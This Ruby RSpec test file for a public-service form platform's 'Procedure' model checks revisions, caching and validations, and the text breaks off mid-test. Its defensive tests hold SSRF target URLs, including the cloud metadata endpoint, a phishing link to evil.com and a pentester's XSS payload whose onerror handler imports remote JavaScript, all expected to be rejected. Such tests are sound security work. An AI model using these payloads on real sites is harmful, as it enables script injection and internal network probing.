# frozen_string_literal: true

describe Procedure do
  describe '#aggregated_type_de_champ_tree' do
    let(:procedure) { procedures.individual }
    let(:removed) { procedure.published_revision.public_root_type_de_champs.first }

    def remove_and_publish
      procedure.draft_revision.remove_type_de_champ(removed.stable_id)
      procedure.publish_revision!(administrateurs.default)
    end

    it 'is the tree of the draft for a procedure never published' do
      procedure = procedures.brouillon

      expect(Rails.cache).not_to receive(:fetch)
      expect(procedure.aggregated_type_de_champ_tree).to eq(procedure.draft_revision.type_de_champ_tree)
    end

    it 'aggregates the published revisions' do
      expect(procedure.aggregated_type_de_champ_tree).to eq(procedure.published_revision.type_de_champ_tree)

      remove_and_publish

      expect(procedure.published_revision.type_de_champ_tree.public_children.map(&:stable_id)).not_to include(removed.stable_id)
      expect(procedure.aggregated_type_de_champ_tree.public_children.map(&:stable_id))
        .to eq([*procedure.published_revision.type_de_champ_tree.public_children.map(&:stable_id), removed.stable_id])
    end

    it 'is memoized until the next publication' do
      aggregated = procedure.aggregated_type_de_champ_tree

      expect(Rails.cache).not_to receive(:fetch)
      expect(procedure.aggregated_type_de_champ_tree).to equal(aggregated)
    end

    it 'leaves out a revision never published' do
      left_behind = procedure.create_new_revision
      left_behind.add_type_de_champ(type_champ: :text, libelle: 'never published')

      expect(left_behind.id).to be > procedure.published_revision_id
      expect(procedure.aggregated_type_de_champ_tree).to eq(procedure.published_revision.type_de_champ_tree)
    end

    it 'is laid out after the published revision, even when a revision published before has a higher id' do
      published_before = procedure.create_new_revision
      published_before.remove_type_de_champ(removed.stable_id)
      published_before.update_columns(published_at: procedure.published_revision.published_at - 1.day)

      expect(published_before.id).to be > procedure.published_revision_id
      expect(procedure.aggregated_type_de_champ_tree).to eq(procedure.published_revision.type_de_champ_tree)
    end

    context 'with a cache' do
      before { allow(Rails).to receive(:cache).and_return(ActiveSupport::Cache::MemoryStore.new) }

      it 'does not go through the revisions again' do
        aggregated = procedure.aggregated_type_de_champ_tree

        expect(procedure).not_to receive(:revisions)
        expect(Procedure.find(procedure.id).aggregated_type_de_champ_tree).to eq(aggregated)
        expect(procedure.aggregated_type_de_champ_tree).to eq(aggregated)
      end

      it 'turns over with a publication' do
        expect(procedure.aggregated_type_de_champ_tree.public_children.last.stable_id).not_to eq(removed.stable_id)

        remove_and_publish

        expect(procedure.aggregated_type_de_champ_tree.public_children.last.stable_id).to eq(removed.stable_id)
      end
    end
  end

  [:lien_notice, :lien_dpo, :web_hook_url].each do |field|
    describe "#{field} validation" do
        let(:procedure) { procedures.brouillon }

        it 'accepts a valid https URL' do
          procedure.send("#{field}=".to_sym, 'https://example.com/')
          expect(procedure).to be_valid
        end

        it 'accepts blank value' do
          procedure.send("#{field}=".to_sym, '')
          expect(procedure).to be_valid
        end

        it 'rejects localhost URL' do
          procedure.send("#{field}=".to_sym, 'http://localhost:3000/admin')
          expect(procedure).not_to be_valid
          expect(procedure.errors[field]).to be_present
        end

        it 'rejects 127.0.0.1' do
          procedure.send("#{field}=".to_sym, 'http://127.0.0.1/admin')
          expect(procedure).not_to be_valid
        end

        it 'rejects link-local metadata endpoint (169.254.169.254)' do
          procedure.send("#{field}=".to_sym, 'http://169.254.169.254/latest/meta-data/')
          expect(procedure).not_to be_valid
        end

        it 'rejects private network 10.x.x.x' do
          procedure.send("#{field}=".to_sym, 'http://10.0.0.1/admin')
          expect(procedure).not_to be_valid
        end

        it 'rejects private network 172.16.x.x' do
          procedure.send("#{field}=".to_sym, 'http://172.16.0.1/admin')
          expect(procedure).not_to be_valid
        end

        it 'rejects private network 192.168.x.x' do
          procedure.send("#{field}=".to_sym, 'http://192.168.1.1/admin')
          expect(procedure).not_to be_valid
        end

        it 'rejects 0.0.0.0' do
          procedure.send("#{field}=".to_sym, 'http://0.0.0.0/')
          expect(procedure).not_to be_valid
        end

        it 'rejects ::1 (IPv6 loopback)' do
          procedure.send("#{field}=".to_sym, 'http://[::1]/admin')
          expect(procedure).not_to be_valid
        end
      end
  end

  describe 'compute_dossiers_count' do
    let(:procedure) { create(:procedure_with_dossiers, dossiers_count: 2, dossiers_count_computed_at: Time.zone.now - Procedure::DOSSIERS_COUNT_EXPIRING) }

    it 'caches estimated_dossiers_count' do
      procedure.dossiers.each(&:passer_en_construction!)
      expect { procedure.compute_dossiers_count }.to change(procedure, :estimated_dossiers_count).from(nil).to(2)
      expect { create(:dossier, procedure: procedure).passer_en_construction! }.not_to change(procedure, :estimated_dossiers_count)

      travel_to(Time.zone.now + Procedure::DOSSIERS_COUNT_EXPIRING + 1.minute)
      expect { procedure.compute_dossiers_count }.to change(procedure, :estimated_dossiers_count).from(2).to(3)
      travel_back
    end
  end

  describe 'scopes' do
    let!(:procedure) { procedures.individual }
    let!(:discarded_procedure) { create(:procedure, :discarded) }

    describe 'default_scope' do
      subject { Procedure.all }
      it 'excludes discarded procedures' do
        is_expected.to include(procedure)
        is_expected.not_to include(discarded_procedure)
      end
    end
  end

  describe 'validation' do
    context 'libelle' do
      it do
        is_expected.not_to allow_value(nil).for(:libelle)
        is_expected.not_to allow_value('').for(:libelle)
        is_expected.to allow_value('Demande de subvention').for(:libelle)
      end
    end

    context 'closing procedure' do
      context 'without replacing procedure in DS' do
        let(:procedure) { procedures.brouillon }

        context 'valid' do
          before do
            procedure.update!(closing_details: "Bonjour,\nLa démarche est désormais hébergée sur une autre plateforme\nCordialement", closing_reason: Procedure.closing_reasons.fetch(:other))
          end

          it { expect(procedure).to be_valid }
        end
      end

      context 'replaced by another procedure in DS' do
        let(:procedure) { procedures.brouillon }

        before { procedure.closing_reason = Procedure.closing_reasons.fetch(:internal_procedure) }

        context 'when the replacing procedure is missing' do
          it 'reports a single blank error' do
            procedure.replaced_by_procedure_id = nil

            expect(procedure).not_to be_valid
            expect(procedure.errors.where(:replaced_by_procedure_id).map(&:type)).to eq([:blank])
          end
        end

        context 'when the replacing procedure is the procedure itself' do
          it 'is invalid' do
            procedure.replaced_by_procedure_id = procedure.id

            expect(procedure).not_to be_valid
            expect(procedure.errors).to be_of_kind(:replaced_by_procedure_id, :other_than)
          end
        end

        context 'when the replacing procedure is another one' do
          it 'is valid' do
            procedure.replaced_by_procedure_id = procedures.individual.id

            expect(procedure).to be_valid
          end
        end
      end
    end

    context 'description' do
      it do
        is_expected.not_to allow_value(nil).for(:description)
        is_expected.not_to allow_value('').for(:description)
        is_expected.to allow_value('Description Demande de subvention').for(:description)
      end
    end

    context 'organisation' do
      it { is_expected.to allow_value('URRSAF').for(:organisation) }
    end

    context 'administrateurs' do
      it { is_expected.not_to allow_value([]).for(:administrateurs) }
    end

    context 'before_remove callback for minimal administrator presence' do
      let(:procedure) { procedures.brouillon }

      it 'raises an error when trying to remove the last administrateur' do
        expect(procedure.administrateurs.count).to eq(1)
        expect {
          procedure.administrateurs.destroy(procedure.administrateurs.first)
        }.to raise_error(
          ActiveRecord::RecordNotDestroyed,
          "Cannot remove the last administrateur of procedure #{procedure.libelle} (#{procedure.id})"
        )
      end
    end

    context 'juridique' do
      it do
        is_expected.not_to allow_value(nil).on(:publication).for(:cadre_juridique)
        is_expected.to allow_value('text').on(:publication).for(:cadre_juridique)
      end

      context 'with deliberation' do
        let(:procedure) { procedures.brouillon.tap { it.cadre_juridique = nil } }

        it { expect(procedure.valid?(:publication)).to eq(false) }

        context 'when the deliberation is uploaded ' do
          before do
            procedure.deliberation = fixture_file_upload('spec/fixtures/files/file.pdf', 'application/pdf')
          end

          it { expect(procedure.valid?(:publication)).to eq(true) }
        end

        context 'when the deliberation is uploaded with an unauthorized format' do
          before do
            procedure.deliberation = fixture_file_upload('spec/fixtures/files/french-flag.gif', 'image/gif')
          end

          it { expect(procedure.valid?(:publication)).to eq(false) }
        end
      end

      context 'when juridique_required is false' do
        let(:procedure) { procedures.brouillon.tap { it.assign_attributes(juridique_required: false, cadre_juridique: nil) } }

        it { expect(procedure.valid?(:publication)).to eq(true) }
      end
    end

    context 'api_particulier_token' do
      let(:jwt_token) { JWT.encode({ exp: 2.months.from_now.to_i }, nil, 'none') }
      let(:legacy_token) { "3841b13fa8032ed3c31d160d3437a76a" }
      let(:expired_token) { JWT.encode({ exp: 1.day.ago.to_i }, nil, 'none') }

      it do
        is_expected.to allow_value(jwt_token).for(:api_particulier_token)
        is_expected.not_to allow_value(legacy_token).for(:api_particulier_token)
        is_expected.not_to allow_value(expired_token).for(:api_particulier_token)
      end

      it 'still saves a procedure whose stored token has expired since' do
        procedure = create(:procedure, api_particulier_token: jwt_token)

        travel_to(3.months.from_now) do
          expect(procedure.update(libelle: 'renamed')).to be(true)
        end
      end

      it 'still saves a procedure whose stored token is a legacy key' do
        procedure = create(:procedure)
        procedure.api_particulier_token = legacy_token
        procedure.save(validate: false)

        expect(procedure.reload.update(libelle: 'renamed')).to be(true)
      end
    end

    context 'monavis' do
      subject { procedure.tap { it.validate(:publication) }.errors.full_messages }

      context 'random string is not allowed' do
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = "plop" } }
        it { is_expected.to eq(["Le code MonAvis doit comporter un lien", "Le code MonAvis doit comporter une image"]) }
      end

      context 'random html is not allowed' do
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = '<img src="http://some.analytics/hello.gif">' } }
        it { is_expected.to include("Le code MonAvis contient une image pointont vers un domaine invalide") }
      end

      context 'Monavis embed code with white button is allowed' do
        monavis_blanc = <<-MSG
        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
          <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-blanc.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_blanc } }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with blue button is allowed' do
        monavis_bleu = <<-MSG
        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
          <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_bleu } }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with old monavis domain still works (backward compatibility)' do
        monavis_old = <<-MSG
        <a href="https://monavis.numerique.gouv.fr/Demarches/123?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d475e4045666057f">
          <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_old } }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with voxusages is allowed' do
        monavis_issue_phillipe = <<-MSG
        <a href="https://voxusagers.numerique.gouv.fr/Demarches/3193?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=58e099a09c02abe629c14905ed2b055d">
          <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
        </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_issue_phillipe } }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code without title allowed' do
        monavis_issue_bouchra = <<-MSG
          <a href="https://voxusagers.numerique.gouv.fr/Demarches/3193?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=58e099a09c02abe629c14905ed2b055d">
            <img src="https://voxusagers.numerique.gouv.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
          </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_issue_bouchra } }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with jedonnemonavis' do
        monavis_jedonnemonavis = <<-MSG
          <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/3839?&view-mode=formulaire-avis&nd_source=button&key=6af80846f64fb213abcabaeea7a3ea8c">
            <img src="https://jedonnemonavis.numerique.gouv.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
          </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_jedonnemonavis } }
        it { is_expected.to eq([]) }
      end

      context 'Monavis embed code with kthxbye' do
        monavis_jedonnemonavis = <<-MSG
          <a href="https://kthxbye.fr/?key=6af80846f64fb213abcabaeea7a3ea8c">
            <img src="https://kthxbye.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
          </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_jedonnemonavis } }
        it { is_expected.to include("Le code MonAvis contient un lien pointant vers un domaine invalide") }
      end

      context 'rejects a link to an arbitrary domain containing monavis as a substring (regex bypass)' do
        malicious_embed = <<-MSG
          <a href="https://evil.com/phishing?ref=monavis&nd_source=button&key=abc123">
            <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="avis" />
          </a>
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = malicious_embed } }
        it { is_expected.to be_present }
      end

      context 'when YWH-PGM5381-46 pentester won' do
        monavis_ywh_pgm5381_46 = <<-MSG
         <a href="https://monavis.numerique.gouv.fr/Demarches/123456?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d4"></a>
         <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.pngx" alt="x" onerror=import('https://hks.ec/ATOXSS-ze4fzfze54.js') />
        MSG
        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_ywh_pgm5381_46 } }
        it { is_expected.to eq(["Le code MonAvis contient un attribut interdit : onerror"]) }
      end

      context 'Monavis embed code with new design (march 26) button Thème clair' do
       monavis_blanc = <<-MSG
        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/4079?button=4509" target='_blank' rel="noopener noreferrer" title="Je donne mon avis - nouvelle fenêtre">

          <img src="https://jedonnemonavis.numerique.gouv.fr/static/bouton-bleu-clair.svg" alt="Je donne mon avis" />

          </a>
        MSG

       let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_blanc } }
       it { is_expected.to eq([]) }
     end

      context 'Monavis embed code with new design (march 26) button Thème sombre' do
        monavis_blanc = <<-MSG
        <a href="https://jedonnemonavis.numerique.gouv.fr/Demarches/4079?button=4509" target='_blank' rel="noopener noreferrer" title="Je donne mon avis - nouvelle fenêtre">

          <img src="https://jedonnemonavis.numerique.gouv.fr/static/bouton-bleu-sombre.svg" alt="Je donne mon avis" />

        </a>
        MSG

        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_blanc } }
        it { is_expected.to eq([]) }
      end
    end

    describe 'duree de conservation dans ds' do
      let(:field_name) { :duree_conservation_dossiers_dans_ds }
      context 'by default is caped to 12' do
        subject { create(:procedure, duree_conservation_dossiers_dans_ds: 12, max_duree_conservation_dossiers_dans_ds: 12) }
        it do
          is_expected.not_to allow_value(nil).for(field_name)
          is_expected.not_to allow_value('').for(field_name)
          is_expected.not_to allow_value('trois').for(field_name)
          is_expected.to allow_value(3).for(field_name)
          is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(12)
        end
      end
      context 'can be over riden' do
        subject { create(:procedure, duree_conservation_dossiers_dans_ds: 60, max_duree_conservation_dossiers_dans_ds: 60) }
        it do
          is_expected.not_to allow_value(nil).for(field_name)
          is_expected.not_to allow_value('').for(field_name)
          is_expected.not_to allow_value('trois').for(field_name)
          is_expected.to allow_value(3).for(field_name)
          is_expected.to allow_value(60).for(field_name)
          is_expected.to validate_numericality_of(field_name).is_less_than_or_equal_to(60)
        end
      end
    end

    describe 'draft type_de_champs validations' do
      let(:procedure) { create(:procedure, public_type_de_champs:, private_type_de_champs:) }

      context 'on a draft procedure' do
        let(:private_type_de_champs) { [] }
        let(:public_type_de_champs) { [{ type: :repetition, libelle: 'Enfants', children: [] }] }

        it 'doesn’t validate the types de champs' do
          procedure.validate
          expect(procedure.errors[:public_draft_type_de_champs]).not_to be_present
        end
      end

      context 'when validating for publication' do
        let(:public_type_de_champs) do
          [
            { type: :repetition, libelle: 'Enfants', children: [] },
            { type: :drop_down_list, libelle: 'Civilité', options: [] },
          ]
        end
        let(:private_type_de_champs) { [] }
        let(:invalid_repetition_error_message) { "doit comporter au moins un champ répétable" }
        let(:invalid_drop_down_error_message) { "doit comporter au moins un choix sélectionnable" }

        it 'validates that no repetition type de champ is empty' do
          procedure.validate(:publication)
          expect(procedure.errors.messages_for(:public_draft_type_de_champs)).to include(invalid_repetition_error_message)

          new_draft = procedure.draft_revision
          repetition = new_draft.public_root_type_de_champs.find(&:repetition?)
          new_draft.add_type_de_champ(type_champ: :text, libelle: 'Nom', parent_stable_id: repetition.stable_id)

          procedure.validate(:publication)
          expect(procedure.errors.messages_for(:public_draft_type_de_champs)).not_to include(invalid_repetition_error_message)
        end

        it 'validates that no drop-down type de champ is empty' do
          drop_down = procedure.draft_revision.public_root_type_de_champs.find(&:any_drop_down_list?)

          drop_down.update!(drop_down_options: [])
          procedure.reload.validate(:publication)
          expect(procedure.errors.messages_for(:public_draft_type_de_champs)).to include(invalid_drop_down_error_message)

          drop_down.update!(drop_down_options: ["--title--", "some value"])
          procedure.reload.validate(:publication)
          expect(procedure.errors.messages_for(:public_draft_type_de_champs)).not_to include(invalid_drop_down_error_message)
        end

        context 'validates fields nested in a repetition' do
          let(:public_type_de_champs) { [{ type: :repetition, libelle: 'Bloc', children: }] }
          let(:private_type_de_champs) { [] }
          let(:repetition) { procedure.draft_revision.type_de_champs.find(&:repetition?) }
          let(:nested_tdc) { procedure.draft_revision.children_of(repetition).first }

          context 'with invalid dropdown' do
            let(:children) { [{ type: :multiple_drop_down_list, libelle: 'Choix imbriqué' }] }
            before { nested_tdc.update!(drop_down_options: []) }

            it 'validates that no drop-down nested in a repetition is empty' do
              procedure.reload.validate(:publication)
              expect(procedure.errors.messages_for(:public_draft_type_de_champs)).to include(a_string_including(invalid_drop_down_error_message))

              nested_tdc.update!(drop_down_options: ["un", "deux"])
              procedure.reload.validate(:publication)
              expect(procedure.errors.messages_for(:public_draft_type_de_champs)).not_to include(a_string_including(invalid_drop_down_error_message))
            end
          end

          context 'with invalid private dropdown' do
            let(:children) { [{ type: :drop_down_list, libelle: 'Choix imbriqué privé' }] }
            let(:public_type_de_champs) { [] }
            let(:private_type_de_champs) { [{ type: :repetition, libelle: 'Bloc', children: }] }
            before { nested_tdc.update!(drop_down_options: []) }

            it 'validates that no private drop-down nested in a repetition is empty' do
              procedure.reload.validate(:publication)
              expect(procedure.errors.messages_for(:private_draft_type_de_champs)).to include(a_string_including(invalid_drop_down_error_message))
            end
          end

          context 'with invalid date range' do
            let(:children) { [{ type: :date, libelle: 'Date' }] }
            before { nested_tdc.update!(range_date: "1", start_date: "2025-12-31", end_date: "2025-01-01") }

            it 'reports the error' do
              procedure.reload.validate(:publication)
              expect(procedure.errors.messages_for(:public_draft_type_de_champs)).to include(a_string_including("La date de début doit être antérieure"))
            end
          end

          context 'with invalid number range' do
            let(:children) { [{ type: :integer_number, libelle: 'Nombre' }] }
            before { nested_tdc.update!(range_number: "1", min_number: "100", max_number: "10") }

            it 'reports the error' do
              procedure.reload.validate(:publication)
              expect(procedure.errors.messages_for(:public_draft_type_de_champs)).to include(a_string_including("La valeur minimale doit être inférieure"))
            end
          end

          context 'with referentiel not ready' do
            let(:referentiel) { create(:api_referentiel, :exact_match) }
            let(:children) { [{ type: :referentiel, libelle: 'Ref', referentiel: }] }

            it 'reports the error' do
              procedure.reload.validate(:publication)
              expect(procedure.errors.messages_for(:public_draft_type_de_champs)).to include(a_string_including("est pas configuré"))
            end
          end

          context 'with blank libelle' do
            let(:children) { [{ type: :text, libelle: 'Texte' }] }
            before { nested_tdc.update_column(:libelle, '') }

            it 'reports the error' do
              procedure.reload.validate(:publication)
              expect(procedure.errors.messages_for(:public_draft_type_de_champs)).to include(a_string_including("Le libellé du champ en position"))
            end
          end
        end

        context 'validates formatted champ character rules' do
          let(:private_type_de_champs) { [] }
          let(:formatted_mode) { "simple" }
          let(:letters_accepted) { "1" }
          let(:numbers_accepted) { "0" }
          let(:special_characters_accepted) { "0" }
          let(:public_type_de_champs) do
            [
              { type: :formatted, formatted_mode:, letters_accepted:, numbers_accepted:, special_characters_accepted: },
            ]
          end

          it 'accepts valid character rules' do
            expect(procedure.valid?(:publication)).to be_truthy
          end

          context "all rules are disabled" do
            let(:letters_accepted) { "0" }
            it 'publication is invalid' do
              expect(procedure.invalid?(:publication)).to be_truthy

              expect(procedure.errors.messages_for(:public_draft_type_de_champs).first).to include("au moins un type de caractère")
            end
          end
        end

        context 'validates formatted champ character length' do
          let(:private_type_de_champs) { [] }
          let(:formatted_mode) { "simple" }
          let(:min_character_length) { "3" }
          let(:max_character_length) { "10" }
          let(:public_type_de_champs) do
            [
              { type: :formatted, formatted_mode:, min_character_length:, max_character_length: },
            ]
          end

          it 'accepts valid character length rules' do
            expect(procedure.valid?(:publication)).to be_truthy
          end

          context "when min > max" do
            let(:min_character_length) { "20" }

            it 'publication is invalid' do
              expect(procedure.invalid?(:publication)).to be_truthy
              expect(procedure.errors.messages_for(:public_draft_type_de_champs).first).to include("inférieur au nombre maximum de caractères")
            end
          end

          context "when max is empty" do
            let(:max_character_length) { "" }
            it 'is valid' do
              expect(procedure.valid?(:publication)).to be_truthy
            end
          end
        end
      end

      context 'when the champ is private' do
        let(:private_type_de_champs) do
          [
            { type: :repetition, libelle: 'Enfants', children: [] },
            { type: :drop_down_list, libelle: 'Civilité', options: [] },
          ]
        end
        let(:public_type_de_champs) { [] }

        let(:invalid_repetition_error_message) { "doit comporter au moins un champ répétable" }
        let(:invalid_drop_down_error_message) { "doit comporter au moins un choix sélectionnable" }

        it 'validates that no repetition type de champ is empty' do
          procedure.validate(:publication)
          expect(procedure.errors.messages_for(:private_draft_type_de_champs)).to include(invalid_repetition_error_message)

          repetition = procedure.draft_revision.private_root_type_de_champs.find(&:repetition?)
          expect(procedure.errors.to_enum.to_a.map { _1.options[:type_de_champ] }).to include(repetition)
        end

        it 'validates that no drop-down type de champ is empty' do
          drop_down = procedure.draft_revision.private_root_type_de_champs.find(&:any_drop_down_list?)
          drop_down.update!(drop_down_options: [])
          procedure.reload.validate(:publication)

          expect(procedure.errors.messages_for(:private_draft_type_de_champs)).to include(invalid_drop_down_error_message)
          expect(procedure.errors.to_enum.to_a.map { _1.options[:type_de_champ] }).to include(drop_down)
        end
      end

      context 'when condition on champ private use public champ' do
        include Logic
        let(:public_type_de_champs) { [{ type: :decimal_number, stable_id: 1 }] }
        let(:private_type_de_champs) { [{ type: :text, condition: ds_eq(champ_value(1), constant(2)), stable_id: 2 }] }
        it 'validate without context' do
          procedure.validate
          expect(procedure.errors.full_messages_for(:private_draft_type_de_champs)).to be_empty
        end

        it 'validate allows condition' do
          procedure.validate(:private_type_de_champs_editor)
          expect(procedure.errors.full_messages_for(:private_draft_type_de_champs)).to be_empty
        end
      end

      context 'when condition on champ private use public champ having a position higher than the champ private' do
        include Logic

        let(:public_type_de_champs) do
          [
            { type: :decimal_number, stable_id: 1 },
            { type: :decimal_number, stable_id: 2 },
          ]
        end

        let(:private_type_de_champs) do
          [
            { type: :text, condition: ds_eq(champ_value(2), constant(2)), stable_id: 3 },
          ]
        end

        it 'validate without context' do
          procedure.validate
          expect(procedure.errors.full_messages_for(:private_draft_type_de_champs)).to be_empty
        end

        it 'validate allows condition' do
          procedure.validate(:private_type_de_champs_editor)
          expect(procedure.errors.full_messages_for(:private_draft_type_de_champs)).to be_empty
        end
      end

      context 'when condition on champ public use private champ' do
        include Logic
        let(:public_type_de_champs) { [{ type: :text, libelle: 'condition', condition: ds_eq(champ_value(1), constant(2)), stable_id: 2 }] }
        let(:private_type_de_champs) { [{ type: :decimal_number, stable_id: 1 }] }
        let(:error_on_condition) { "Le champ a une logique conditionnelle invalide" }

        it 'validate without context' do
          procedure.validate
          expect(procedure.errors.full_messages_for(:public_draft_type_de_champs)).to be_empty
        end

        it 'validate prevent condition' do
          procedure.validate(:public_type_de_champs_editor)
          expect(procedure.errors.full_messages_for(:public_draft_type_de_champs)).to include(error_on_condition)
        end
      end
    end

    context 'with auto archive' do
      let(:procedure) { create(:procedure, auto_archive_on: 1.day.from_now) }

      it { expect(procedure).to be_valid }

      context 'when auto_archive_on is in the past' do
        it 'validates only when attribute is changed' do
          procedure.auto_archive_on = 1.day.ago
          expect(procedure).not_to be_valid
          expect(procedure.errors).to be_of_kind(:auto_archive_on, :greater_than)

          procedure.save!(validate: false)
          expect(procedure).to be_valid
        end
      end

      context 'when auto_archive_on is today' do
        it 'is invalid' do
          procedure.auto_archive_on = Date.current
          expect(procedure).not_to be_valid
          expect(procedure.errors).to be_of_kind(:auto_archive_on, :greater_than)
        end
      end

      context 'when auto_archive_on is removed' do
        it 'is valid' do
          procedure.auto_archive_on = nil
          expect(procedure).to be_valid
        end
      end
    end

    context 'with sva svr' do
      before {
        procedure.sva_svr["decision"] = "svr"
      }

      context 'when procedure is published with sva' do
        let(:procedure) { create(:procedure, :published, :sva) }

        it 'prevents changes to sva_svr' do
          expect(procedure).not_to be_valid
          expect(procedure.errors[:sva_svr].join).to include('ne peut plus être modifiée')
        end
      end

      context 'when procedure is published without sva' do
        let(:procedure) { procedures.individual }

        it 'allow activation' do
          expect(procedure).to be_valid
        end

        it 'allow activation from disabled value' do
          procedure.sva_svr["decision"] = "disabled"
          procedure.save!

          procedure.sva_svr["decision"] = "svr"

          expect(procedure).to be_valid
        end
      end

      context 'brouillon procedure' do
        let(:procedure) { create(:procedure, :sva) }

        it "can update sva config" do
          expect(procedure).to be_valid
        end
      end

      context "with declarative" do
        let(:procedure) { create(:procedure, declarative_with_state: "accepte") }

        it 'is not valid' do
          expect(procedure).not_to be_valid
          expect(procedure.errors[:sva_svr].join).to include('incompatible avec une démarche déclarative')
        end
      end
    end
  end

  describe 'opendata' do
    let(:procedure) { procedures.brouillon }

    it 'is true by default' do
      expect(procedure.opendata).to be_truthy
    end
  end

  describe 'publiques' do
    let(:draft_procedure) { create(:procedure_with_dossiers, :draft, estimated_dossiers_count: 4, lien_site_web: 'https://monministere.gouv.fr/cparici') }
    let(:published_procedure) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, lien_site_web: 'https://monministere.gouv.fr/cparici') }
    let(:published_procedure_no_opendata) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, opendata: false) }
    let(:published_procedure_without_dossier) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 0) }
    let(:published_procedure_with_mail) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, lien_site_web: 'par mail') }
    let(:published_procedure_with_intra) { create(:procedure_with_dossiers, :published, estimated_dossiers_count: 4, lien_site_web: 'https://intra.service-etat.gouv.fr') }

    it 'returns published procedure, with opendata flag, with accepted lien_site_web' do
      expect(Procedure.publiques).not_to include(published_procedure_no_opendata)
    end

    it "returns only published or closed procedures" do
      expect(Procedure.publiques).not_to include(draft_procedure)
    end

    it "returns only procedures with opendata flag" do
      expect(Procedure.publiques).not_to include(published_procedure_with_mail)
    end

    it "returns only procedures without mail in lien_site_web" do
      expect(Procedure.publiques).not_to include(published_procedure_with_mail)
    end

    it "returns only procedures without intra in lien_site_web" do
      expect(Procedure.publiques).not_to include(published_procedure_with_intra)
    end

    it "does not return procedures without any dossier" do
      expect(Procedure.publiques).not_to include(published_procedure_without_dossier)
    end
  end

  describe 'active' do
    let(:procedure) { procedures.brouillon }
    subject { Procedure.active(procedure.id) }

    context 'when procedure is in draft status and not closed' do
      it { expect { subject }.to raise_error(ActiveRecord::RecordNotFound) }
    end

    context 'when procedure is published and not closed' do
      let(:procedure) { procedures.individual }
      it { is_expected.to be_truthy }
    end

    context 'when procedure is published and closed' do
      let(:procedure) { procedures.close }
      it { expect { subject }.to raise_error(ActiveRecord::RecordNotFound) }
    end
  end

  describe '#publish!' do
    let(:procedure) { create(:procedure, path: 'example-path', zones: [zones.default]) }
    let(:now) { Time.zone.now.beginning_of_minute }

    context 'when publishing a new procedure' do
      before do
        travel_to(now) do
          procedure.publish!(procedure.administrateurs.first)
        end
      end

      it 'no reference to the canonical procedure on the published procedure' do
        expect(procedure.canonical_procedure).to be_nil
      end

      it 'changes the procedure state to published' do
        expect(procedure.closed_at).to be_nil
        expect(procedure.published_at).to eq(now)
        expect(Procedure.find_with_path("example-path").first).to eq(procedure)
        expect(Procedure.find_with_path("example-path").first.administrateurs).to eq(procedure.administrateurs)
      end

      it 'creates a new draft revision' do
        expect(procedure.published_revision).not_to be_nil
        expect(procedure.draft_revision).not_to be_nil
        expect(procedure.revisions.count).to eq(2)
        expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
      end
    end

    context 'when publishing over a previous canonical procedure' do
      let(:canonical_procedure) { procedures.individual }

      before do
        travel_to(now) do
          procedure.publish!(procedure.administrateurs.first, canonical_procedure)
        end
      end

      it 'references the canonical procedure on the published procedure' do
        expect(procedure.canonical_procedure).to eq(canonical_procedure)
      end

      it 'changes the procedure state to published' do
        expect(procedure.closed_at).to be_nil
        expect(procedure.published_at).to eq(now)
      end
    end
  end

  describe "#unpublish!" do
    let(:procedure) { procedures.individual }
    let(:now) { Time.zone.now.beginning_of_minute }

    before do
      travel_to(now) do
        procedure.unpublish!
      end
    end

    it {
      expect(procedure.closed_at).to eq(nil)
